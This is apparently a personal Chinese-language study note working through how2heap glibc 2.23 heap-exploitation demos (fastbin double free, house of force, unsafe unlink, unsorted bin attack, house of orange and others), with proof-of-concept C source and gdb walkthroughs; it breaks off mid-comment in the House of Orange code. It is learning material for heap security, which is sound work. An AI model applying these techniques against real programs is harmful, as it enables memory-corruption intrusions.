---
title: "HOW2HEAP"
date: 2026-11-26 00:24:33
categories:
  - "题目复现"
  - "how2heap"
tags: ["fastbin", "unsorted-bin", "unlink", "UAF", "double-free", "HouseOfSpirit", "IO-FILE", "malloc-consolidate"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#8 -->
## 2.23（部分）

## fastbin_dump

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

其实就只是double基于fastbin机制下的

gdb调一下

```bash
gcc -g -O0 -o double_free fastbin_dup.c
```

![image-20261027183522092](/pwn-notes/images/notes/image-20261027183522092.png)

申请一个堆块之后是这样的接下来申请完

![image-20261027183627665](/pwn-notes/images/notes/image-20261027183627665.png)

删除a

![image-20261027183748075](/pwn-notes/images/notes/image-20261027183748075.png)

删除b

![image-20261027183851996](/pwn-notes/images/notes/image-20261027183851996.png)

再次删除a

![image-20261027183934946](/pwn-notes/images/notes/image-20261027183934946.png)

a被释放两次，a此时又变成了头部

此时也是变成了环，这就形成了double free

接下来申请

![image-20261027184708700](/pwn-notes/images/notes/image-20261027184708700.png)

确实，申请两次之后，确实里面确实还是原本b指向的a堆块的地址

![image-20261027184957833](/pwn-notes/images/notes/image-20261027184957833.png)

![image-20261027185638062](/pwn-notes/images/notes/image-20261027185638062.png)

可以看到a和c所指向的地址一样

这就是double达到的效果

Fastbin Double Free 是通过打破 `fasttop` 检查，在 Fastbin 单链表中制造**环**，从而实现**同一块内存被多次分配（UAF）**，最终达到劫持 `fd` 指针、实现**任意地址分配（Arbitrary Alloc）**的目的。

## fastbin_dup_consolidate

```bash
gcc -g -O0 -o 1 1.c
```

源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
double free to gain two pointers to the same large-sized chunk, which is usually difficult to do 
directly due to the previnuse check.

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
if possible.

As of glibc version 2.35 it is called only in the following five places:
1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

We will be targeting the first place, so we will need to allocate a chunk that does not belong in the 
small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). 
This means our chunk will need to be of size >= 0x400 (it is thus large-sized).

*/

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n");

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```

看介绍似乎也是实现一个双指的作用，先申请一个小的之后释放掉，之后再申请一个大的，触发相关机制，fastbin中的与topchunk合并，使得再次分配的时候就会使得大堆块的内存地址与一开始申请的小的相同。

然后free小的指针，然后大的chunk就会被释放，之后再次申请大chunk，这次申请的地址就会和上一次申请的大chunk地址相同。从而实现双指。

有什么用？

![image-20261027194200212](/pwn-notes/images/notes/image-20261027194200212.png)



调试：

申请小堆0x40

![image-20261027194637072](/pwn-notes/images/notes/image-20261027194637072.png)

接下来先释放这个堆块进入fastbin

![image-20261027194826915](/pwn-notes/images/notes/image-20261027194826915.png)

接下来申请大堆块

![image-20261027194916118](/pwn-notes/images/notes/image-20261027194916118.png)

可以看到和一开始申请的小堆块地址一样

![image-20261027195013744](/pwn-notes/images/notes/image-20261027195013744.png)

接下来再释放p1

![image-20261027195129358](/pwn-notes/images/notes/image-20261027195129358.png)

释放完之后居然哪个bin也没有进入吗？

![image-20261027195623280](/pwn-notes/images/notes/image-20261027195623280.png)

行。然后再次申请大堆块，好像不管申请什么，都会获得一开始的地址

![image-20261027195807843](/pwn-notes/images/notes/image-20261027195807843.png)

![image-20261027195921605](/pwn-notes/images/notes/image-20261027195921605.png)

三个指针都指向开头

这个还是大的堆块，释放后还是会与topchunk合并。

行吧，起码知道还能这样。

## fastbin_dup_into_stack

这是写入栈中吗？（似乎是先将返回地址写入fd，之后直接篡改返回地址指向后门函数什么的）

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

服了，一直给我讲伪造堆块的size字段，讲为什么-8啥的，真服了。直接调

首先就是构造double free

![image-20261027204750354](/pwn-notes/images/notes/image-20261027204750354.png)

首先申请3个在0x20大小范围的堆块

释放a

![image-20261027204931085](/pwn-notes/images/notes/image-20261027204931085.png)

之后free b之后再次free a造成double free

![image-20261027205028965](/pwn-notes/images/notes/image-20261027205028965.png)

接下来d申请一个小堆块，使得和a指向同一个堆块

![image-20261027205148806](/pwn-notes/images/notes/image-20261027205148806.png)

![image-20261027205243894](/pwn-notes/images/notes/image-20261027205243894.png)

接下来修改d就相当于修改a的相关结构内容了

![image-20261027205523134](/pwn-notes/images/notes/image-20261027205523134.png)

还可以看到此时的fastbin链表头是chunkb

而它之后有申请了一次，使得a变成链表头

![image-20261027205718737](/pwn-notes/images/notes/image-20261027205718737.png)

![image-20261027205743194](/pwn-notes/images/notes/image-20261027205743194.png)

确实如此

然后他之后就开始吓唬搞了

![image-20261027205844207](/pwn-notes/images/notes/image-20261027205844207.png)

![image-20261027210026081](/pwn-notes/images/notes/image-20261027210026081.png)

fastbin取出的时候会检查fd指向的堆块的size字段。而现在d指向的就是a的fd字段，我们想修改这里，使得验证通过。

因为是0x20 而那个地址存的值就是0x20，而一般size字段是在chunk头的+0x8字节，所以是size-0x8+0x8得到的就是0x20.

那么他最终获得的是，maloc获得的是+0x10之后的，所以

最后获得的就是stack_var+0x8的地址是堆块首地址

![image-20261027211140248](/pwn-notes/images/notes/image-20261027211140248.png)

这是修改d之前

接下来修改d指针指向的值

![image-20261027211242376](/pwn-notes/images/notes/image-20261027211242376.png)

可以看到a的fd指针处的值确实被修改了

![image-20261027211349629](/pwn-notes/images/notes/image-20261027211349629.png)

他后面8字节确实是0x20

![image-20261027211441213](/pwn-notes/images/notes/image-20261027211441213.png)

在这里可以看到，在又一次申请堆块之后栈地址确实是被写入了

![image-20261027212251212](/pwn-notes/images/notes/image-20261027212251212.png)

所以说这就是最后得到的申请的堆块吗，地址是98结尾的，之后如果这里是返回地址的话，直接篡改就行了。

![image-20261027212701087](/pwn-notes/images/notes/image-20261027212701087.png)

又调一次

![image-20261027212728784](/pwn-notes/images/notes/image-20261027212728784.png)

![image-20261027212748094](/pwn-notes/images/notes/image-20261027212748094.png)

接下来e指向的就是那个地址

![image-20261027212833357](/pwn-notes/images/notes/image-20261027212833357.png)

![image-20261027212922598](/pwn-notes/images/notes/image-20261027212922598.png)

确实是申请到了栈地址

所以主要的就是伪造的栈地址需要满足size字段，之后fd改为size-0x8

之后malloc得到的地址就是size+0x10

## house_of_einherjar

使用条件：**单字节越界（off-by-one）**，可以向一块 malloc 分配出的堆块写入一个空字节（null byte）的场景

unlink checks

复用机制：

**如果前一个块还在用，我这个块的 `prev_size` 就借给他当数据区用。**

不多说了兄弟们，看了翻译就是一个堆块溢出之后，修改下一个的presize字段（还需要考虑unlink机制），之后的话，直接free就行了吧应该

```c
gcc -g -O0 -o 1 1.c
```

![image-20261028103837602](/pwn-notes/images/notes/image-20261028103837602.png)

首先就是申请一个小堆块

我去原来第一个堆块加上的大小不是0x10而是0x8，前面的pre_size字段被复用了

![image-20261028104220458](/pwn-notes/images/notes/image-20261028104220458.png)

而且

![image-20261028104325734](/pwn-notes/images/notes/image-20261028104325734.png)

![image-20261028104354983](/pwn-notes/images/notes/image-20261028104354983.png)

所以大小是0x40字节

然后接下来需要真实的chunka大小

![image-20261028104602563](/pwn-notes/images/notes/image-20261028104602563.png)

接下来伪造fake_chunk

![image-20261028104710928](/pwn-notes/images/notes/image-20261028104710928.png)

![image-20261028111924432](/pwn-notes/images/notes/image-20261028111924432.png)

然后申请的是0xf8大小的

![image-20261028104836598](/pwn-notes/images/notes/image-20261028104836598.png)

![image-20261028104910324](/pwn-notes/images/notes/image-20261028104910324.png)

接下来直接溢出

![image-20261028112954764](/pwn-notes/images/notes/image-20261028112954764.png)

![image-20261028113116376](/pwn-notes/images/notes/image-20261028113116376.png)

可以看到b的size字段低位变成0

接下来好像是直接算偏移，用b的chunk地址减去伪造fake_chunk的地址，这应该是大小吧

![image-20261028113556663](/pwn-notes/images/notes/image-20261028113556663.png)

可以看到b的pre_size字段已经被修改了

![image-20261028113744757](/pwn-notes/images/notes/image-20261028113744757.png)

这应该就是计算过程

![image-20261028113844704](/pwn-notes/images/notes/image-20261028113844704.png)

fake[chunk1]=fake_size

![image-20261028113930492](/pwn-notes/images/notes/image-20261028113930492.png)

![image-20261028114229310](/pwn-notes/images/notes/image-20261028114229310.png)

free（b）之后的效果

![image-20261028114804832](/pwn-notes/images/notes/image-20261028114804832.png)

fake_chunk的大小改变了，

![image-20261028115346751](/pwn-notes/images/notes/image-20261028115346751.png)

接下来申请堆块

![image-20261028115414287](/pwn-notes/images/notes/image-20261028115414287.png)

![image-20261028115450441](/pwn-notes/images/notes/image-20261028115450441.png)

可以看到，申请的堆首地址是我们伪造的fake_chunk,接下来就可以在此修改内容

嘶就是堆块重叠，之后的话，伪造堆块（需要注意绕过unlink机制，之后再次申请堆块需要绕过检查），堆溢出修改pre_size的标志位，

之后修改伪造堆块的size,改成计算出来的pre_size,之后的话就可以free,之后再次申请，就可以得到我们伪造堆块的地址，进而修改其内容。

## house_of_force（任意地址写）

哦，这个是修改top_chunk的size字段，使得直接从top_chunk分配相应大小的堆块

相应操作记起来好像只有，将top_chunk字段改为-1,当然需要首先安防一个小堆块用来堆溢出，之后free这个小堆块之后，（这里好像并没有和top_chunk合并）会和top_chunk合并，因为我们申请的是一个大堆块。之后就会直接从top_chunk分配，有啥用？只是申请一个地址吗？

原来是通过修改top_chunk的相关偏移，得到申请堆块的大小，进而实现任意地址写

![image-20261028151922821](/pwn-notes/images/notes/image-20261028151922821.png)

```c
gcc -g -O0 -o 1 1.c
```

首先我们想要下下一次分配的地址是目标地址：

new_top=target-0x10(这样的话下一次malloc才会分配（new_top+0x10=target）)

那么我们第一次请求的大小是多少？

首先new_top=old_top+nb(malloc.size+0x10)

而 new_top=target-0x10=old_top+nb(malloc.size+0x10)

所以malloc.size=target-0x20-old_top

这个就是我们想要请求的大小

接下来直接调：

![image-20261028152912666](/pwn-notes/images/notes/image-20261028152912666.png)

首先申请0x100大小的堆块

![image-20261028152945959](/pwn-notes/images/notes/image-20261028152945959.png)

![image-20261028153103287](/pwn-notes/images/notes/image-20261028153103287.png)

接下来知道top_chunk的地址

![image-20261028153239486](/pwn-notes/images/notes/image-20261028153239486.png)

![image-20261028153257103](/pwn-notes/images/notes/image-20261028153257103.png)

接下来修改top_chunk的大小

![image-20261028153508489](/pwn-notes/images/notes/image-20261028153508489.png)

![image-20261028153723098](/pwn-notes/images/notes/image-20261028153723098.png)

虽然上面会提示一大堆，但是最终还是修改完成了

接下来就是计算我们需要申请的大小

![image-20261028153849818](/pwn-notes/images/notes/image-20261028153849818.png)

进行申请

![image-20261028154549845](/pwn-notes/images/notes/image-20261028154549845.png)

接下来会申请堆块，获得的malloc地址就是我们的target_addr

![image-20261028155115270](/pwn-notes/images/notes/image-20261028155115270.png)

接下来修改内容

![image-20261028155324955](/pwn-notes/images/notes/image-20261028155324955.png)

![image-20261028163551997](/pwn-notes/images/notes/image-20261028163551997.png)

可以看到相关的内容确实被改写了

希望不要忘记

接下来我就挑一点值得复现的做做

## unsafe_unlink

脱链吗？希望之前看的一部分还有点用

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}


```

```bash
gcc -g -O0 -o 1 1.c
```

额，我觉得就是在原来的第一个堆块上伪造相应的fd和bk（所以最后），着重伪造的应该是

其fd字段和bk字段

fd:fakechunk-0x18    bk:fakechunk-0x10

之后再次篡改下一个堆块的pre_size的大小和标志位，在free这个堆块的时候就会触发unlink

这个时候我们伪造的堆块就会起作用，

![image-20261028174812894](/pwn-notes/images/notes/image-20261028174812894.png)

之后就修改原本指针指向的地址。有点乱

调一下：

首先申请一个0x80大小的堆块chunk0

![image-20261028175519431](/pwn-notes/images/notes/image-20261028175519431.png)

接下来又申请一个0x80大小的堆块为chunk1

![image-20261029144743903](/pwn-notes/images/notes/image-20261029144743903.png)

chunk1也可以了

![image-20261029150024128](/pwn-notes/images/notes/image-20261029150024128.png)

好吧，这两个指针有点耐人寻味

也就是说这个指针在内存中的地址是

0x602078

而它实际指向的的是

0x603010

接下来在chunk0里面创建fake_chunk

![image-20261029150856724](/pwn-notes/images/notes/image-20261029150856724.png)

这是一开始创建的chunk0

接下来执行完这一句之后

![image-20261029151024898](/pwn-notes/images/notes/image-20261029151024898.png)

![image-20261029151116123](/pwn-notes/images/notes/image-20261029151116123.png)

伪造的fd被写入进去

接下来是伪造的bk

![image-20261029151244533](/pwn-notes/images/notes/image-20261029151244533.png)

接下来应该修改的是chunk1的pre_size位置

![image-20261029152822009](/pwn-notes/images/notes/image-20261029152822009.png)

可以看到确实是被换成了0x80

但是我们需要伪造的是前一个堆块被释放的状态，所以，还需要修改其size位最后字节为0

![image-20261029153046744](/pwn-notes/images/notes/image-20261029153046744.png)

修改完成，但是应该还需要修改fake_chunk的size位，以至于更好通过检查。额，好i谢谢昂不对

![image-20261029153330702](/pwn-notes/images/notes/image-20261029153330702.png)

居然直接free掉堆块了吗

![image-20261029153621529](/pwn-notes/images/notes/image-20261029153621529.png)

这是释放完之后的样子，bins里什么都没有

![image-20261029153704557](/pwn-notes/images/notes/image-20261029153704557.png)

我去，怎么指过去的？

![image-20261029154646723](/pwn-notes/images/notes/image-20261029154646723.png)

（额）原来chunk0的指针存在0x602078这个位置，然后指向的是0x603010

之后触发unlink机制，之后的话

最后一句是

BK-fd=FD

而FD就是0x602078-0x18=0x602060

所以就是将0x602078指向的内容从0x603010变成0x602060

所以此时的chunk0也就是0x602078还以为指向的是0x603010,但是其实已经变成0x602060

所以chunk0[3]就是0x602078,之后再次将这个地址里面写入栈上地址，之后

看这：：：：：：：

也就是一开始&chunk0是0x602078指向的是0x603010,之后的话，改成了0x602060,而现在chunk[3] (修改其指向的内容为栈上地址)，之后修改chunk[0]就会变成修改栈上内容了

![](/pwn-notes/images/notes/image-20261029155946398.png)

![image-20261029163320021](/pwn-notes/images/notes/image-20261029163320021.png)

修改完之后直接修改数据即可。

这就是unlink实现任意地址写。服了。

##  unsorted_bin_attack

```bash
gcc -g -O0 -o 1 1.c
```

反正这个就是任意地址写入大数据

![image-20261031103616274](/pwn-notes/images/notes/image-20261031103616274.png)

只需要将目标地址-0x10写入即将进入的unsortedbin

之后在进入unsoretdbin之后再次申请之后就可以触发相关的攻击写入

首先

![image-20261031104441800](/pwn-notes/images/notes/image-20261031104441800.png)

![image-20261031104816213](/pwn-notes/images/notes/image-20261031104816213.png)

可以看到已经有数据是一开始设置的0

之后申请大堆块

![image-20261031110714763](/pwn-notes/images/notes/image-20261031110714763.png)

首先设置指针p指向堆块内容区

之后直接

![image-20261031111531658](/pwn-notes/images/notes/image-20261031111531658.png)

接着再申请一个防止free之后与topchunk合并

![image-20261031111858342](/pwn-notes/images/notes/image-20261031111858342.png)

接下来应该是将target-0x10写入其bk位置

![image-20261031112155237](/pwn-notes/images/notes/image-20261031112155237.png)

首先是free之后再写入

![image-20261031112230857](/pwn-notes/images/notes/image-20261031112230857.png)

已经进入unsortedbin,

![image-20261031112307913](/pwn-notes/images/notes/image-20261031112307913.png)

所以说在最后触发攻击的时候是在释放的时候

![image-20261031122038219](/pwn-notes/images/notes/image-20261031122038219.png)

![image-20261031122203741](/pwn-notes/images/notes/image-20261031122203741.png)

接下来就是将目标地址-0x10放进bk，最后就可以

![image-20261031122705021](/pwn-notes/images/notes/image-20261031122705021.png)

已经写进去了，之后直接malloc

![image-20261031122827004](/pwn-notes/images/notes/image-20261031122827004.png)

看到68位置的值已经被修改了

反正应该就是只要大于0x80就可以

放进去

## house of spirit

首先申请一个小堆块

![image-20261031155157719](/pwn-notes/images/notes/image-20261031155157719.png)

接下来应该是在栈上寻找一个合适的位置来放置合适的假堆块

![image-20261031161050242](/pwn-notes/images/notes/image-20261031161050242.png)

修改fake_chunk的size

![image-20261031161501216](/pwn-notes/images/notes/image-20261031161501216.png)

之后修改另一个

然后是将堆指针改成db20哪个位置

![image-20261031162531704](/pwn-notes/images/notes/image-20261031162531704.png)

![image-20261031164746229](/pwn-notes/images/notes/image-20261031164746229.png)

接下来接着申请0x30的堆块就可以

获取到栈地址上的堆块了

![image-20261031170158895](/pwn-notes/images/notes/image-20261031170158895.png)

你有空好好看吧

## poison_null_byte

调一下

申请一个0x100的堆块

![image-20261102100613877](/pwn-notes/images/notes/image-20261102100613877.png)

接着申请三个堆块，最后那一个是用来防止合并的

![image-20261102100805816](/pwn-notes/images/notes/image-20261102100805816.png)

![image-20261102101149747](/pwn-notes/images/notes/image-20261102101149747.png)

![image-20261102103317798](/pwn-notes/images/notes/image-20261102103317798.png)

这一步就是为了绕过相关检查机制，因为现在它的大小已经被改成0x200所以接下来就会去下方0x200大小的地方寻找相邻堆块的pre_size位置，之后就会绕过检查

![image-20261102103816165](/pwn-notes/images/notes/image-20261102103816165.png)

接下来就free并且修改chunkb 的size字段

![image-20261102104726964](/pwn-notes/images/notes/image-20261102104726964.png)

![image-20261102104758758](/pwn-notes/images/notes/image-20261102104758758.png)

size字段已经修改完成

## House of orange

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc 
  <House of Orange 技术利用堆溢出漏洞来篡改 _IO_list_all 指针。它（在利用时）需要堆地址和 libc 地址的泄露。”>
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
   <这个函数仅仅是为了模拟‘已知 system 函数地址’的场景而存在的>
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */这是申请堆块
        

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
